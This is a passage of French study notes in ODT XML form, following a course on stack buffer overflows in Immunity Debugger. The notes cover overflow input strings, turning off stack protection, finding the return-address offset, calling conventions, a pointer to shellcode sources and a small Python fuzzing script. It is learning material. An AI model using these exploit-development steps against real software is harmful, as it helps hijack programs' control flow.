      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images10" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="1.221cm" draw:z-index="9"><draw:image xlink:href="Pictures/20000007000064C60000073D53859F44.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">L'adresse 005A17A0 qui est stockée comme adresse de retour dans la pile correspond à l'adresse suivant exactement l'instruction d'appel à la fonction "functionFunction" (voir page précédente).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Quand on fait un autre "Step Into", on se retrouve dans le code correspondant à "functionFunction" :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images12" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.872cm" draw:z-index="11"><draw:image xlink:href="Pictures/2000000700007D4300001C884AEB1AC7.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Si on "Step into" plusieurs instructions ensuite, on retrouve bien les variables locales empilées quand on examine la pile :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images13" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.748cm" draw:z-index="12"><draw:image xlink:href="Pictures/200000070000645C0000103BCA107466.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Conformément au schéma du <text:span text:style-name="T30">[LIVRE PAGE 76]</text:span>, on a bien les arguments, l'adresse de retour, puis les variables locales dans la pile.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Après plusieurs "Step Into" (bien plus que dans la vidéo, où une instruction LEAVE terminait la fonction "functionFunction", ce qui désempile automatiquement le bloc d'activation. Ci-dessous on a bien LEAVE avec un autre compilateur), notre bloc d'activation est désempilé (pop), et disparaît de la stack.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Bref, on a dans l'ensemble vu un comportement normal du programme dans le débugger. Je me demande si toutes les instructions supplémentaires que j'ai eu, et les différences avec la vidéo ne venaient pas du fait que mon programme .c a été compilé avec Visual Studio (EDIT : oui c'est le cas).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12"><text:soft-page-break/>&gt; Vidéo 0210 :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On a vu comment le programme se comportait en temps normal. Maintenant on va examiner son comportement lors d'un <text:span text:style-name="T1">buffer overflow</text:span>.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On va dans "Debug", "Arguments", puis on va entrer cette fois :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">123456789AAAAAAAAABBBBBBBBCCCCCCCCDDDDDDD</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ensuite, dans "Debug", on fait "restart". Et on run jusqu'à notre breakpoint, qui est toujours le même. Comme d'habitude :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images14" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="4.849cm" draw:z-index="13"><draw:image xlink:href="Pictures/2000000700007C3B0000237440B0A19D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Et quand on Step Into le call à functionFunction, on est amené à une commande JMP au début du code :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images15" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="0.393cm" draw:z-index="14"><draw:image xlink:href="Pictures/200000070000626500000247ED713AD8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">La valeur des arguments et l'adresse de retour sont empilées :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images16" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="1.252cm" draw:z-index="15"><draw:image xlink:href="Pictures/200000070000651500000772F73A9B44.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">La commande JMP nous amène à functionFunction :</text:p>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr5" draw:name="images17" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="7.364cm" draw:z-index="16"><draw:image xlink:href="Pictures/2000000700006EB100002FF6DD8E9832.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">On définit nos variables (functionFunction, FFEEDDCC), qui vont sur la pile également. Après <text:soft-page-break/>quelques step into, on en est là :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images18" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="7.283cm" draw:z-index="17"><draw:image xlink:href="Pictures/2000000700006E7C00002F5772DF09AE.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Et dans la pile, on trouve notre argument (une seconde fois puisqu'il est déjà empilé plus bas) :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images19" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.228cm" draw:z-index="18"><draw:image xlink:href="Pictures/2000000700006C0200000E2A20041FCA.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Pourquoi il est empilé là ? Je ne sais pas, je dirais que c'est parce qu'il va être appelé par strcpy comme un argument de la fonction. Bref, l'instruction suivante est <text:span text:style-name="T2">CALL bufferov.00C110C3</text:span>. Ce qui appelle en réalité strcpy :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images20" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="0.806cm" draw:z-index="19"><draw:image xlink:href="Pictures/200000070000714600000561607DE2DD.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Au fur et à mesure qu'on step into cette fonction strcpy, on voit qu'une valeur stockée dans un register (ici ECX) est petit à petit consommée :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images21" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.388cm" draw:z-index="20"><draw:image xlink:href="Pictures/20000007000042E000000D5689F22E83.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Là on en est à peu près au milieu des A. Cela signifie tout simplement que la valeur donnée en argument est progressivement copiée dans notre tableau localstring2. Une fois que c'est fini, on arrive à une instruction RETN qui nous ramène à functionFunction, juste après l'appel à strcpy :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr5" draw:name="images22" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="6.11cm" draw:z-index="21"><draw:image xlink:href="Pictures/2000000700006C1B000026DD7445469E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">A partir de là, la fonction était censée appeler LEAVE, puis RETN, mais ne pas réussir à RETN à la fonction main, car l'adresse de retour a été corrompue.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Le problème c'est que moi, dans mon programme compilé, j'ai apparemment des mécanismes de défense contre les corruption de pile. Suite à mon appel de strcpy, après quelques Step into, j'ai appelé d'autres fonctions qui m'ont redirigé vers la fonction "exit with error message", en affichant que la valeur de la pile a été corrompue autour de la valeur 'localstring2'.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Je vais essayer de désactiver la protection contre la corruption de la pile dans Visual Studio, puis de recommencer (on va dans la solution dans Visual Studio, puis dans Properties, C/C++, Code Generation, et on désactive "Security Check"). Une fois qu'on l'a fait, on a rebuild la solution. Voyons maintenant ce que ça donne dans ImmunityDebugger, avec comme argument :</text:p>
      <text:p text:style-name="P9">123456789AAAAAAAAABBBBBBBBCCCCCCCCDDDDDDD</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">N'a pas non plus fonctionné, même en désactivant la sécurité j'ai quand même mon programme qui part vers une fonction de vérification de la pile, en me disant que cette dernière a été corrompue.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Bon, changement de stratégie du coup. J'ai installé Dev-C++ (le programme que le prof utilise) afin de compiler mon petit programme en C.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Le fichier .exe est beaucoup plus volumineux avec ce compilateur. Quand on essaie de l'ouvrir avec Immunity, on a un message d'erreur comme quoi notre programme ne serait sûrement pas un 32 bits portable executable. Ce qui veut dire que ImmunityDebugger ne prend en charge que les exécutables en 32 bits. On revient dans Dev-C++, et on s'aperçoit que le compilateur était un 64 bits. On passe sur un compilateur 32 bits, et là on arrive bien à ouvrir notre programme.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Et là, magique, on a notre debugger qui nous affiche exactement ce que le prof a à l'écran ; le code en assembleur semble lui-même bien moins compliqué ; on commence au début de ce qui nous intéresse. Bref, nos deux fonctions ressemblent simplement à ça :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr1" draw:name="images23" text:anchor-type="paragraph" svg:width="20.057cm" svg:height="8.239cm" draw:z-index="22"><draw:image xlink:href="Pictures/2000000700007C07000032F5178EA85A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">On est reparti pour examiner tout ça, pas à pas. On met en argument "123456789AAAAAAAAABBBBBBBBCCCCCCCCDDDDDDD". Puis on met un breakpoint à l'adresse 0040153B, et on fait tourner le programme.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr1" draw:name="images24" text:anchor-type="paragraph" svg:width="18.962cm" svg:height="3.461cm" draw:z-index="23"><draw:image xlink:href="Pictures/200000070000753500001566289B30DE.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">On "Step Into" quelques instructions, avant d'en arriver à une instruction CALL. La pile a cette tête :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images25" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.265cm" draw:z-index="24"><draw:image xlink:href="Pictures/20000007000065B40000138A75D629A7.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Je ne sais pas pourquoi on a deux fois notre argument (une fois plus haut dans la fonction main, une fois à l'instruction CALL). Mais peu importe, on Step Into notre instruction CALL. On entre directement dans functionFunction. On se place à l'instruction précédant l'appel à strcpy :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images26" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.113cm" draw:z-index="25"><draw:image xlink:href="Pictures/2000000700007D45000016F367DE2B8F.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9"><text:soft-page-break/>L'état de la pile est le suivant :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images27" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="5.525cm" draw:z-index="26"><draw:image xlink:href="Pictures/2000000700006D0B0000237446EBA735.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">On y voit :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">&gt; L'argument de la fonction.</text:p>
      <text:p text:style-name="P9">&gt; L'adresse de retour (0040155B).</text:p>
      <text:p text:style-name="P9">&gt; Les arguments locaux (ASCII "functionFunction" et FFEEDDCC).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Et de nouveaux l'argument de la fonction, qui assez étrangement revient plusieurs fois. Retenons bien que l'adresse de retour est sauvegardée à l'adresse 0062FE7C.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On Step Into la fonction strcpy, qui se comporte comme on l'a décrit ci-dessus. Une fois qu'on a appelé strcpy, il est intéressant de remarquer que la pile ressemble désormais à ça :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images28" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="6.071cm" draw:z-index="27"><draw:image xlink:href="Pictures/20000007000063390000237400F15068.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">On a ici exactement les mêmes adresses mémoires dans la pile. Et on voit que notre argument, stocké dans le tableau localstring2, a complètement overwrite : les arguments locaux, qui se trouvaient en-dessus à des adresses plus hautes, mais aussi l'adresse de retour. A l'adresse où se trouvait l'adresse retour (0062FE7C), on a désormais des "C" uniquement (ou plutôt 43, son code ASCII).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Et de manière très logique, quand on essaie de Step Into l'instruction RETN de la fonction functionFunction, on se retrouve avec ce message d'erreur dans le débuggeur :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images29" text:anchor-type="paragraph" svg:width="10.821cm" svg:height="3.836cm" draw:z-index="28"><draw:image xlink:href="Pictures/2000000700002A4600000EFD5FBA4173.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">En appelant l'instruction RETN, le pointeur EIP essaie de retourner à l'adresse 43434343, ce qui est impossible, et donc le programme crash.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12">&gt; Vidéo 0211 :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Dans cette vidéo, on explique quelques concepts entourant les <text:span text:style-name="T1">stack buffer overflows</text:span>. Apparemment pour bien les comprendre, il sera utile pour la suite de connaître les différentes <text:span text:style-name="T1">Calling Conventions</text:span>. Les calling conventions définissent simplement la manière dont les arguments sont passés aux fonctions. Il y a 3 conventions pour Windows-32 bits :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T38">●</text:span> Cdecl</text:p>
      <text:p text:style-name="P9"/>
      <text:list xml:id="list5888566179504993754" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P38">Tous les arguments sont enregistrés sur la pile.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P38">L'appelant est en charge de nettoyer la pile après l'appel de la fonction (la fonction qui appelle l'autre fonction est donc chargée de nettoyer la pile).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P38">Les arguments sont empilés de droite à gauche.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Cette Calling Convention est obligatoire pour les fonctions qui prennent un nombre variable d'arguments. La raison est que si la fonction peut prendre un nombre variable d'arguments, la fonction elle-même ne saura pas quel espace libérer lorsqu'elle sera finie ; par contre, la fonction qui l'a appelé le saura, et pourra donc nettoyer la pile.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P18">● Stdcall</text:p>
      <text:p text:style-name="P18"/>
      <text:list xml:id="list8208752619991738495" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P40">All arguments are passed on the stack.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P40">L'appelé est en charge de nettoyer la pile (la fonction appelée donc).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P40">Ne peut pas être utilisé par des fonctions avec un nombre variable d'arguments (par exemple printf).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P40">Les arguments sont empilés sur la pile de droite à gauche.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18">Il est plus rapide que la fonction appelée se charge elle-même de nettoyer la pile quand elle est terminée, car le code qui permet de faire cela sera à un seul endroit (dans la fonction appelée), au lieu de devoir être présent dans toutes les fonctions qui l'appellent.</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18">● Fastcall</text:p>
      <text:p text:style-name="P18"/>
      <text:list xml:id="list8394164058504596967" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P41">Les deux premiers arguments sont passés dans les registres ECX et EDX.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P41">Le reste des arguments est empilé de droite à gauche sur la pile.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P41">L'appelé est en charge de nettoyer la pile si besoin (c'est-à-dire s'il y a plus que 2 arguments, sinon tout se passe dans les registres).</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P18"><text:soft-page-break/></text:p>
      <text:p text:style-name="P18">Fastcall est un peu plus rare que les deux Calling Conventions précédentes. </text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P9"><text:span text:style-name="T38">Maintenant qu'on a vu ces Calling Conventions, revenons plus précisément sur le concept de </text:span><text:span text:style-name="T39">stack buffer overflow</text:span><text:span text:style-name="T38">. </text:span></text:p>
      <text:p text:style-name="P19">[LIVRE PAGE 143 - 149]</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On répète qu'en gros, l'idée c'est d'overwrite notre adresse de retour. Mais ce qui est intéressant dans la vidéo par rapport au livre, c'est qu'ici on nous dit que le but c'est d'overwrite l'adresse de retour, mais également <text:span text:style-name="T30">ce qu'il y a après</text:span>. L'idée, c'est que l'adresse de retour sera une adresse située <text:span text:style-name="T30">juste après </text:span>la position de l'adresse de retour dans la pile, et c'est donc juste après qu'on va injecter notre Shell Code.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Pour résumer, dans le livre on est sur cette configuration :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images30" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="11.571cm" draw:z-index="29"><draw:image xlink:href="Pictures/200000070000733E00004E73C48332EE.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Mais ici, on parlerait plutôt de cette configuration :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images31" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="12.418cm" draw:z-index="30"><draw:image xlink:href="Pictures/20000007000069D600004D5003163C91.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">Cette seconde configuration n'est pas mauvaise si l'adresse de retour vient très vite après notre variable locale qui overflow, et qu'on a donc pas vraiment la place d'injecter notre Shellcode.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Concernant le Shell Code, il s'agit simplement de code machine qui va nous permettre de faire quelque chose. On peut créer son propre Shellcode, mais en général on copie simplement celui de quelqu'un d'autre (par exemple sur <text:a xlink:type="simple" xlink:href="http://shell-storm.org/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://shell-storm.org/</text:a>).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12">&gt; Vidéo 0212 :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On revient à notre programme exemple, en c, pour un bufferoverflow (ci-dessus).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">L'idée dans cette vidéo, c'est de savoir au bout de combien de bytes exactement notre buffer va dépasser sur l'adresse de retour. Dans les schémas précédants, on la répète un grand nombre de fois pour être sûr ; mais ici, on va essayer d'être plus précis, et de savoir au bout de combien de bytes dans le buffer on va devoir insérer l'adresse permettant ensuite de mener au shellcode.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Le prof utilisait les messages d'erreur Windows pour le déterminer assez facilement (voir la vidéo pour plus de détails). Ce que je ne peux pas faire (pas de message d'erreur quand le programme crash sur Windows 10). </text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Donc on va développer une autre technique. On débug notre programme avec ImmunityDebugger. En argument du programme, on a mis 9 "A", donc le buffer ne dépasse pas, le programme fonctionne. On définit un breakpoint avant le retour de la fonction functionFunction à la fonction main. Notre pile, au breakpoint, ressemble à ça :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images32" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="4.598cm" draw:z-index="31"><draw:image xlink:href="Pictures/2000000700005CD10000191EBF0BD173.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">On voit deux choses :</text:p>
      <text:p text:style-name="P9"/>
      <text:list xml:id="list8548452098196789384" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P39">Notre adresse de retour est<text:span text:style-name="T41"> </text:span><text:span text:style-name="T42">0040155B</text:span> ; elle est stockée sur 4 bytes correspondant à 4 adresses mémoires (une adresse mémoire = 1 byte) : <text:span text:style-name="T43">0062FE7C</text:span> – 0062FE7D – 0062FE7E – 0062FE7F.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P39">Notre buffer de "A" commence à l'adresse <text:span text:style-name="T40">0062FE5E</text:span> ; </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ce qu'on veut savoir, c'est combien il y a de bytes (ou d'adresses mémoires) entre le début de notre buffer (<text:span text:style-name="T40">0062FE5E</text:span>) et le début de notre adresse retour (<text:span text:style-name="T43">0062FE7C</text:span>). Donc on va chercher une calculatrice hexadécimale en ligne, et on fait :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T40">0062FE5E + x = </text:span><text:span text:style-name="T43">0062FE7C</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T43">x = <text:s/>0062FE7C – </text:span><text:span text:style-name="T40">0062FE5E</text:span></text:p>
      <text:p text:style-name="P25">x = 1e (en hexadécimal)</text:p>
      <text:p text:style-name="P25">(x = 30)</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P9">Entre l'adresse où commence le buffer, et l'adresse où commence l'adresse retour, il y a 30 bytes (donc de la place pour 30 caractères). C'est pourquoi, pour que le dernier byte du tableau dépasse sur le premier byte de l'adresse retour, il faut 31 caractères.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Avec 29 "A" comme argument, la pile ressemble à ça :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images33" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.729cm" draw:z-index="32"><draw:image xlink:href="Pictures/2000000700005982000013A461B56567.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">L'adresse de retour est intacte, et même le dernier NULL BYTE terminant le buffer ne dépasse pas.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Avec 30 "A" comme argument, la pile ressemble à ça :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images34" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.965cm" draw:z-index="33"><draw:image xlink:href="Pictures/20000007000054A6000013BFE3D6B26D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">Ici, le NULL BYTE terminant le tableau a écrasé le premier byte de l'adresse retour, soit 5B (c'est bien le premier, car orientation little-endian).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Avec 34 "A", la pile ressemble à ça :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images35" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.727cm" draw:z-index="34"><draw:image xlink:href="Pictures/2000000700005AF4000013F33F39F1AA.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">On a complètement écrasé l'adresse de retour. Conclusion : l'espace entre les 31ème et 34ème bytes du tableau écrasent l'adresse de retour sauvegardée. Donc typiquement, si j'ai 30 "A", puis 4 "B" aux bytes 31,32,33 et 34, ma pile ressemble à ça :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images36" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.752cm" draw:z-index="35"><draw:image xlink:href="Pictures/2000000700005A56000013F3B3FDE37A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Le problème, c'est bien sûr que je ne veux pas que mon programme me redirige vers l'adresse "42424242", je veux une adresse que j'aurai moi-même confectionnée. Le problème étant que, puisqu'il s'agit d'un tableau de caractères, ces caractères sont stockés dans leur format hexadécimal ; compliqué de former une adresse mémoire à partir de ça ("00" par exemple en hexadécimal n'a pas d'équivalent en ASCII).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">C'est d'ailleurs pour ça que dans le livre (p.127 / p.144), on construit un exploit avec dans le tableau passé en argument les adresses de retour sous la forme d'entiers non-signés (qui entrent dans le buffer par forçage de type).</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">En réalité, on peut quand même utiliser la technique du prof dans sa vidéo 0212, sur notre hôte Windows 10, pour savoir au bout de combien de bytes dans le buffer on va devoir insérer l'adresse permettant ensuite de mener au shellcode.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/>On entre notre programme main.exe avec beaucoup de 'A' en argument :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P17">main.exe "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Le programme va bien sûr crash. Maintenant, si on va dans "Event Viewer" sur Windows, onglet Journaux Windows – Application, on tombe sur ça :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images37" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="10.548cm" draw:z-index="36"><draw:image xlink:href="Pictures/200000070000577100003644FF0FEC14.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Windows nous montre l'adresse mémoire à laquelle on a tenté d'accéder lorsque le programme a crash.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ce qui peut nous être utile pour déterminer au bout de combien de bytes il faudra insérer notre adresse mémoire. En effet, on écrit le petit script python suivant :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P17">import subprocess</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">param = "main.exe "</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">for i in range(0xa1, 0xff):</text:p>
      <text:p text:style-name="P17"><text:tab/>param += chr(i)</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">subprocess.call(param)</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Quand on le fait tourner, on va dans notre Event Viewer, et on récupère l'erreur suivante :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images38" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="10.169cm" draw:z-index="37"><draw:image xlink:href="Pictures/200000070000542200003256C3F95423.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
